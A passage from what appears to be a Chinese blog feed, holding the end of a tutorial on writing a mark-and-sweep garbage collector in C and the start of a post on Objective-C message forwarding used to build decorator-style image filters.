&lt;p&gt;第二部分是，当扫描完所有可能的内存空间后，我们遍历已用块链表将所有未被标记的内存块移到空闲块链表中。&lt;/p&gt;
&lt;p&gt;现在很多人会开始认为只是靠编写类似于malloc那样的简单函数来实现C的垃圾回收是不可行的，因为在函数中我们无法获得其外面的很多信息。例如，在C语言中没有函数可以返回分配到堆栈中的所有变量的哈希映射。但是只要我们意识到两个重要的事实，我们就可以绕过这些东西：&lt;/p&gt;
&lt;p&gt;第一，在C中，你可以尝试访问任何你想访问的内存地址。因为不可能有一个数据块编译器可以访问但是其地址却不能被表示成一个可以赋值给指针的整数。如果一块内存在C程序中被使用了，那么它一定可以被这个程序访问。这是一个令不熟悉C的编程者很困惑的概念，因为很多编程语言都会限制程序访问虚拟内存，但是C不会。&lt;/p&gt;
&lt;p&gt;第二，所有的变量都存储在内存的某个地方。这意味着如果我们可以知道变量们的通常存储位置，我们可以遍历这些内存位置来寻找每个变量的所有可能值。另外，因为内存的访问通常是字(word-size)对齐的，因此我们仅需要遍历内存区域中的每个字(word)即可。&lt;/p&gt;
&lt;p&gt;局部变量也可以被存储在寄存器中，但是我们并不需要担心这些因为寄存器经常会用于存储局部变量，而且当函数被调用的时候他们通常会被存储在堆栈中。&lt;/p&gt;
&lt;p&gt;现在我们有一个标记阶段的策略：遍历一系列的内存区域并查看是否有内存可能指向已用块链表。编写这样的一个函数非常的简洁明了：&lt;/p&gt;
&lt;blockquote readability=&quot;30&quot;&gt;
&lt;p&gt;; html-script: false ]&lt;/p&gt;
&lt;p&gt;#define UNTAG(p) (((unsigned int) (p)) &amp;amp; 0xfffffffc)&lt;/p&gt;

&lt;p&gt;/*&lt;/p&gt;
&lt;p&gt;* Scan a region of memory and mark any items in the used list appropriately.&lt;/p&gt;
&lt;p&gt;* Both arguments should be word aligned.&lt;/p&gt;
&lt;p&gt;*/&lt;/p&gt;
&lt;p&gt;static void&lt;/p&gt;
&lt;p&gt;mark_from_region(unsigned int *sp, unsigned int *end)&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;    header_t *bp;&lt;/p&gt;

&lt;p&gt;    for (; sp &amp;lt; end; sp++) {&lt;/p&gt;
&lt;p&gt;        unsigned int v = *sp;&lt;/p&gt;
&lt;p&gt;        bp = usedp;&lt;/p&gt;
&lt;p&gt;        do {&lt;/p&gt;
&lt;p&gt;            if (bp + 1 &amp;lt;= v &amp;amp;&amp;amp;&lt;/p&gt;
&lt;p&gt;                bp + 1 + bp-&amp;gt;size &amp;gt; v) {&lt;/p&gt;
&lt;p&gt;                    bp-&amp;gt;next = ((unsigned int) bp-&amp;gt;next) | 1;&lt;/p&gt;
&lt;p&gt;                    break;&lt;/p&gt;
&lt;p&gt;            }&lt;/p&gt;
&lt;p&gt;        } while ((bp = UNTAG(bp-&amp;gt;next)) != usedp);&lt;/p&gt;
&lt;p&gt;    }&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为了确保我们只使用头(header)中的两个字长(two words)我们使用一种叫做标记指针(tagged pointer)的技术。利用header中的next指针指向的地址总是字对齐(word aligned)这一特点，我们可以得出指针低位的几个有效位总会是0。因此我们将next指针的最低位进行标记来表示当前块是否被标记。&lt;/p&gt;
&lt;p&gt;现在，我们可以扫描内存区域了，但是我们应该扫描哪些内存区域呢？我们要扫描的有以下这些：&lt;/p&gt;
&lt;p&gt;BBS(未初始化数据段)和初始化数据段。这里包含了程序的全局变量和局部变量。因为他们有可能应用堆(heap)中的一些东西，所以我们需要扫描BSS与初始化数据段。&lt;/p&gt;
&lt;p&gt;已用的数据块。当然，如果用户分配一个指针来指向另一个已经被分配的内存块，我们不会想去释放掉那个被指向的内存块。&lt;/p&gt;
&lt;p&gt;堆栈。因为堆栈中包含所有的局部变量，因此这可以说是最需要扫描的区域了。&lt;/p&gt;
&lt;p&gt;我们已经了解了关于堆(heap)的一切，因此编写一个mark_from_heap函数将会非常简单：&lt;/p&gt;
&lt;blockquote readability=&quot;44&quot;&gt;
&lt;p&gt;; html-script: false ] /*&lt;/p&gt;
&lt;p&gt;* Scan the marked blocks for references to other unmarked blocks.&lt;/p&gt;
&lt;p&gt;*/&lt;/p&gt;
&lt;p&gt;static void&lt;/p&gt;
&lt;p&gt;mark_from_heap(void)&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;    unsigned int *vp;&lt;/p&gt;
&lt;p&gt;    header_t *bp, *up;&lt;/p&gt;

&lt;p&gt;    for (bp = UNTAG(usedp-&amp;gt;next); bp != usedp; bp = UNTAG(bp-&amp;gt;next)) {&lt;/p&gt;
&lt;p&gt;        if (!((unsigned int)bp-&amp;gt;next &amp;amp; 1))&lt;/p&gt;
&lt;p&gt;            continue;&lt;/p&gt;
&lt;p&gt;        for (vp = (unsigned int *)(bp + 1);&lt;/p&gt;
&lt;p&gt;             vp &amp;lt; (bp + bp-&amp;gt;size + 1);&lt;/p&gt;
&lt;p&gt;             vp++) {&lt;/p&gt;
&lt;p&gt;            unsigned int v = *vp;&lt;/p&gt;
&lt;p&gt;            up = UNTAG(bp-&amp;gt;next);&lt;/p&gt;
&lt;p&gt;            do {&lt;/p&gt;
&lt;p&gt;                if (up != bp &amp;amp;&amp;amp;&lt;/p&gt;
&lt;p&gt;                    up + 1 &amp;lt;= v &amp;amp;&amp;amp;&lt;/p&gt;
&lt;p&gt;                    up + 1 + up-&amp;gt;size &amp;gt; v) {&lt;/p&gt;
&lt;p&gt;                    up-&amp;gt;next = ((unsigned int) up-&amp;gt;next) | 1;&lt;/p&gt;
&lt;p&gt;                    break;&lt;/p&gt;
&lt;p&gt;                }&lt;/p&gt;
&lt;p&gt;            } while ((up = UNTAG(up-&amp;gt;next)) != bp);&lt;/p&gt;
&lt;p&gt;        }&lt;/p&gt;
&lt;p&gt;    }&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;幸运的是对于BSS段和已初始化数据段，大部分的现代unix链接器可以导出 etext 和 end 符号。etext符号的地址是初始化数据段的起点(the last address past the text segment，这个段中包含了程序的机器码)，end符号是堆(heap)的起点。因此，BSS和已初始化数据段位于 &amp;amp;etext 与 &amp;amp;end 之间。这个方法足够简单，当不是平台独立的。&lt;/p&gt;
&lt;p&gt;堆栈这部分有一点困难。堆栈的栈顶非常容易找到，只需要使用一点内联汇编即可，因为它存储在 sp 这个寄存器中。但是我们将会使用的是 bp 这个寄存器，因为它忽略了一些局部变量。&lt;/p&gt;
&lt;p&gt;寻找堆栈的的栈底(堆栈的起点)涉及到一些技巧。出于安全因素的考虑，内核倾向于将堆栈的起点随机化，因此我们很难得到一个地址。老实说，我在寻找栈底方面并不是专家，但是我有一些点子可以帮你找到一个准确的地址。一个可能的方法是，你可以扫描调用栈(call stack)来寻找 env 指针，这个指针会被作为一个参数传递给主程序。另一种方法是从栈顶开始读取每个更大的后续地址并处理inexorible SIGSEGV。但是我们并不打算采用这两种方法中的任何一种，我们将利用linux会将栈底放入一个字符串并存于proc目录下表示该进程的文件中这一事实。这听起来很愚蠢而且非常间接。值得庆幸的是，我并不感觉这样做是滑稽的，因为它和Boehm GC中寻找栈底所用的方法完全相同。&lt;/p&gt;
&lt;p&gt;现在我们可以编写一个简单的初始化函数。在函数中，我们打开proc文件并找到栈底。栈底是文件中第28个值，因此我们忽略前27个值。Boehm GC和我们的做法不同的是他仅使用系统调用来读取文件来避免让stdlib库使用堆(heap)，但是我们并不在意这些。&lt;/p&gt;
&lt;blockquote readability=&quot;23&quot;&gt;
&lt;p&gt;; html-script: false ]/*&lt;/p&gt;
&lt;p&gt;* Find the absolute bottom of the stack and set stuff up.&lt;/p&gt;
&lt;p&gt;*/&lt;/p&gt;
&lt;p&gt;void&lt;/p&gt;
&lt;p&gt;GC_init(void)&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;    static int initted;&lt;/p&gt;
&lt;p&gt;    FILE *statfp;&lt;/p&gt;

&lt;p&gt;    if (initted)&lt;/p&gt;
&lt;p&gt;        return;&lt;/p&gt;

&lt;p&gt;    initted = 1;&lt;/p&gt;

&lt;p&gt;    statfp = fopen(&quot;/proc/self/stat&quot;, &quot;r&quot;);&lt;/p&gt;
&lt;p&gt;    assert(statfp != NULL);&lt;/p&gt;
&lt;p&gt;    fscanf(statfp,&lt;/p&gt;
&lt;p&gt;           &quot;%*d %*s %*c %*d %*d %*d %*d %*d %*u &quot;&lt;/p&gt;
&lt;p&gt;           &quot;%*lu %*lu %*lu %*lu %*lu %*lu %*ld %*ld &quot;&lt;/p&gt;
&lt;p&gt;           &quot;%*ld %*ld %*ld %*ld %*llu %*lu %*ld &quot;&lt;/p&gt;
&lt;p&gt;           &quot;%*lu %*lu %*lu %lu&quot;, &amp;amp;stack_bottom);&lt;/p&gt;
&lt;p&gt;    fclose(statfp);&lt;/p&gt;

&lt;p&gt;    usedp = NULL;&lt;/p&gt;
&lt;p&gt;    base.next = freep = &amp;amp;base;&lt;/p&gt;
&lt;p&gt;    base.size = 0;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;现在我们知道了每个我们需要扫描的内存区域的位置，所以我们终于可以编写显示调用的回收函数了：&lt;/p&gt;
&lt;blockquote readability=&quot;74&quot;&gt;
&lt;p&gt;; html-script: false ] /*&lt;/p&gt;
&lt;p&gt;* Mark blocks of memory in use and free the ones not in use.&lt;/p&gt;
&lt;p&gt;*/&lt;/p&gt;
&lt;p&gt;void&lt;/p&gt;
&lt;p&gt;GC_collect(void)&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;    header_t *p, *prevp, *tp;&lt;/p&gt;
&lt;p&gt;    unsigned long stack_top;&lt;/p&gt;
&lt;p&gt;    extern char end, etext; /* Provided by the linker. */&lt;/p&gt;

&lt;p&gt;    if (usedp == NULL)&lt;/p&gt;
&lt;p&gt;        return;&lt;/p&gt;

&lt;p&gt;    /* Scan the BSS and initialized data segments. */&lt;/p&gt;
&lt;p&gt;    mark_from_region(&amp;amp;etext, &amp;amp;end);&lt;/p&gt;

&lt;p&gt;    /* Scan the stack. */&lt;/p&gt;
&lt;p&gt;    asm volatile (&quot;movl    %%ebp, %0&quot; : &quot;=r&quot; (stack_top));&lt;/p&gt;
&lt;p&gt;    mark_from_region(stack_top, stack_bottom);&lt;/p&gt;

&lt;p&gt;    /* Mark from the heap. */&lt;/p&gt;
&lt;p&gt;    mark_from_heap();&lt;/p&gt;

&lt;p&gt;    /* And now we collect! */&lt;/p&gt;
&lt;p&gt;    for (prevp = usedp, p = UNTAG(usedp-&amp;gt;next);; prevp = p, p = UNTAG(p-&amp;gt;next)) {&lt;/p&gt;
&lt;p&gt;    next_chunk:&lt;/p&gt;
&lt;p&gt;        if (!((unsigned int)p-&amp;gt;next &amp;amp; 1)) {&lt;/p&gt;
&lt;p&gt;            /*&lt;/p&gt;
&lt;p&gt;             * The chunk hasn't been marked. Thus, it must be set free.&lt;/p&gt;
&lt;p&gt;             */&lt;/p&gt;
&lt;p&gt;            tp = p;&lt;/p&gt;
&lt;p&gt;            p = UNTAG(p-&amp;gt;next);&lt;/p&gt;
&lt;p&gt;            add_to_free_list(tp);&lt;/p&gt;

&lt;p&gt;            if (usedp == tp) {&lt;/p&gt;
&lt;p&gt;                usedp = NULL;&lt;/p&gt;
&lt;p&gt;                break;&lt;/p&gt;
&lt;p&gt;            }&lt;/p&gt;

&lt;p&gt;            prevp-&amp;gt;next = (unsigned int)p | ((unsigned int) prevp-&amp;gt;next &amp;amp; 1);&lt;/p&gt;
&lt;p&gt;            goto next_chunk;&lt;/p&gt;
&lt;p&gt;        }&lt;/p&gt;
&lt;p&gt;        p-&amp;gt;next = ((unsigned int) p-&amp;gt;next) &amp;amp; ~1;&lt;/p&gt;
&lt;p&gt;        if (p == usedp)&lt;/p&gt;
&lt;p&gt;            break;&lt;/p&gt;
&lt;p&gt;    }&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;朋友们，所有的东西都已经在这了，一个用C为C程序编写的垃圾回收器。这些代码自身并不是完整的，它还需要一些微调来使它可以正常工作，但是大部分代码是可以独立工作的。&lt;/p&gt;
&lt;p&gt;总结&lt;/p&gt;
&lt;p&gt;一开始就打算编写完整的程序是很困难的，你编程的唯一算法就是分而治之。先编写内存分配函数，然后编写查询内存的函数，然后是清除内存的函数。最后将它们合在一起。&lt;/p&gt;
&lt;p&gt;当你在编程方面克服这个障碍后，就再也没有困难的实践了。你可能有一个算法不太了解，但是任何人只要有足够的时间就肯定可以通过论文或书理解这个算法。如果有一个项目看起来令人生畏，那么将它分成完全独立的几个部分。你可能不懂如何编写一个解释器，但你绝对可以编写一个分析器，然后看一下你还有什么需要添加的，添上它。相信自己，终会成功！&lt;/p&gt;
&lt;p&gt;喜欢小编文章的小伙伴可以给小编点赞或者转发哦！小编先感谢各位看官了！&lt;/p&gt;
</description>
<pubDate>Thu, 27 Dec 2018 15:36:00 +0000</pubDate>
<dc:creator>修语谈谈C/C++</dc:creator>
<og:description>人们似乎认为编写垃圾回收机制是很难的，是一种只有少数智者和Hans Boehm(et al)才能理解的高深魔法。我认为编写垃圾回收最难的地方就是内存分配，这和阅读K&amp;R所写的malloc样例难</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/2f3d/p/10188181.html</dc:identifier>
</item>
<item>
<title>利用OC对象的消息重定向forwardingTargetForSelector方法构建高扩展性的滤镜功能 - 滴水微澜</title>
<link>http://www.cnblogs.com/zhou--fei/p/10188140.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhou--fei/p/10188140.html</guid>
<description>&lt;p&gt;在OC中，当像一个对象发送消息，而对象找到消息后，从它的类方法列表，父类方法列表，一直找到根类方法列表都没有找到与这个选择子对应的函数指针。那么这个对象就会触发消息转发机制。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;OC对象的继承链和isa指针链如图：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/826860/201812/826860-20181227230728133-1377379450.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;消息转发流程如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.先调用实例方法resolveInstanceMethod&lt;/p&gt;
&lt;p&gt;如果作者在这里使用runtime动态添加对应的方法，并且返回yes。就万事大吉。对象找到了处理的方法，&lt;/p&gt;
&lt;p&gt;并且将这个新增的方法添加到类的方法缓存列表&lt;/p&gt;
&lt;p&gt;2.如果上面的方法返回NO的话，对象会调用forwardingTargetForSelector方法&lt;/p&gt;
&lt;p&gt;允许作者选择其他的对象，处理这个消息。&lt;/p&gt;
&lt;p&gt;这个方法，也是待会我们要做文章的地方。画重点。&lt;/p&gt;
&lt;p&gt;3.如果上面两个方法都没有做处理，那么对象会执行最后一个方法methodSignatureForSelector,提供一个有效的方法签名，若提供了有效的方法签名，程序将会通过forwardInvocation方法执行签名。若没有提供方法签名就会触发doesNotRecognizeSelector方法，触发崩溃。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;整个调用流程图如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/826860/201812/826860-20181227230936724-1782825178.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; 整个代码调用顺序如下：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;
+&lt;span&gt; (BOOL)resolveClassMethod:(SEL)sel {
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;1---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(sel));
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;1---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(_cmd));
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NO;
}
&lt;/span&gt;+&lt;span&gt; (BOOL)resolveInstanceMethod:(SEL)sel {
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;1---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(sel));
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;1---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(_cmd));
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NO;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;
- (&lt;span&gt;id&lt;/span&gt;&lt;span&gt;)forwardingTargetForSelector:(SEL)aSelector {
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;2---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(aSelector));
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;2---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(_cmd));
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; nil;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;3.最后一步，返回方法签名&lt;/span&gt;
-(NSMethodSignature *&lt;span&gt;)methodSignatureForSelector:(SEL)aSelector{
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;3---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(aSelector));
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;3---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(_cmd));
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ([NSStringFromSelector(aSelector) isEqualToString:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;gogogo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;]) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; [[UnknownModel2 &lt;span&gt;new&lt;/span&gt;&lt;span&gt;] methodSignatureForSelector:aSelector];
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; [super methodSignatureForSelector:aSelector];
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;3.1处理返回的方法签名&lt;/span&gt;
-(&lt;span&gt;void&lt;/span&gt;)forwardInvocation:(NSInvocation *&lt;span&gt;)anInvocation{
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;4---%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,NSStringFromSelector(_cmd));
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;4-最后一步--%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,anInvocation);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ([NSStringFromSelector(anInvocation.selector) isEqualToString:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;gogogo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;]) {
        [anInvocation invokeWithTarget:[UnknownModel2 &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt;]];
    }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
        [super forwardInvocation:anInvocation];
    }
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;触发崩溃&lt;/span&gt;
- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)doesNotRecognizeSelector:(SEL)aSelector {
    
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;打印结果如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.469445&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;1&lt;/span&gt;---&lt;span&gt;gogogo
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.469613&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;1&lt;/span&gt;---&lt;span&gt;resolveInstanceMethod:
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.469765&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;2&lt;/span&gt;---&lt;span&gt;gogogo
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.469873&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;2&lt;/span&gt;---&lt;span&gt;forwardingTargetForSelector:
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.469978&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;3&lt;/span&gt;---&lt;span&gt;gogogo
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.470097&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;3&lt;/span&gt;---&lt;span&gt;methodSignatureForSelector:
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.470247&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;1&lt;/span&gt;---&lt;span&gt;_forwardStackInvocation:
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.470355&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;1&lt;/span&gt;---&lt;span&gt;resolveInstanceMethod:
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.470765&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;4&lt;/span&gt;---&lt;span&gt;forwardInvocation:
 &lt;/span&gt;&lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.471367&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] &lt;span&gt;4&lt;/span&gt;-最后一步--&amp;lt;NSInvocation: &lt;span&gt;0x600002442000&lt;/span&gt;&amp;gt;
 &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;12&lt;/span&gt;-&lt;span&gt;27&lt;/span&gt; &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;00.471969&lt;/span&gt;+&lt;span&gt;0800&lt;/span&gt; iOS_KnowledgeStructure[&lt;span&gt;7940&lt;/span&gt;:&lt;span&gt;110114&lt;/span&gt;] lalalalala---gogogo
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;OC消息转发的应用&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;当消息转发走到第二步时forwardingTargetForSelector，会让对象提供一个第三者来处理这个消息。&lt;/p&gt;
&lt;p&gt;那么可以得出结论：只要对对象发送没有实现的消息，对象最后就会寻找一个第三者来接收这个消息。&lt;/p&gt;
&lt;p&gt;下面就利用消息转发机制，构建装饰器，来实现图像滤镜功能。 &lt;/p&gt;
&lt;p&gt;&lt;strong&gt; 科普一下装饰器模式。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;装饰器模式概念：&lt;/p&gt;
&lt;p&gt;装饰器模式是向对象添加东西（行为），而不破坏原有对象内容结构的一种设计模式。举个例子，对象如同照片，装饰器如同相框。而一张照片可以放到多种相框内产生多种赏心悦目的效果，而又不会对照片产生改变。&lt;/p&gt;

&lt;p&gt;装饰器模式UML图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/826860/201812/826860-20181227231339359-890630233.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;说明如下：&lt;/p&gt;
&lt;p&gt;1.Component为抽象父类，它为组件声明了一些操作。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;ConcreteComponent为实例组件类，相当于图像滤镜中的原材料“图片”。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.Decorator为从Component父类实现而来的子抽象类，它是装饰器的抽象父类。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;它里面包含了组件“图片”（图中的属性：component）的引用。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;3.Component父类，Decorator父类都包含了operation接口。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.下面的“由装饰器扩展功能”的标示部分，展示了用装饰器为组件“图片”添加功能的实际使用。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;图像滤镜的UML类图为： &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/826860/201812/826860-20181227231546817-1157379382.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图像滤镜的uml类图同装饰器类图的uml结构一致。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;ImageComponent抽象父类定义接口，UIImage作为实例组件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;ImageFilter作为滤镜父类接口，扩充类apply方法。并且对组件(component)添加引用。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;重点 重点 重点：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在 forwardingTargetForSelector中先调用自己的apply方法，然后返回它所引用的component.&lt;/p&gt;
&lt;p&gt;1.因为ImageFilter装饰器中没有draw:方法，所以向Image对象发送[self setNeedDisplay]消息时，ImageFilter对象会调用自己的forwardingTargetForSelector方法，这方法内包含了当前装饰器的功能扩展，会执行扩展功能。&lt;/p&gt;
&lt;p&gt;2.方法的最后有return component; 这一句是进行消息转发，让component对象进行处理这次绘制。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; 主要代码实现如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;mageComponent抽象父类接口设计如下：&lt;/p&gt;
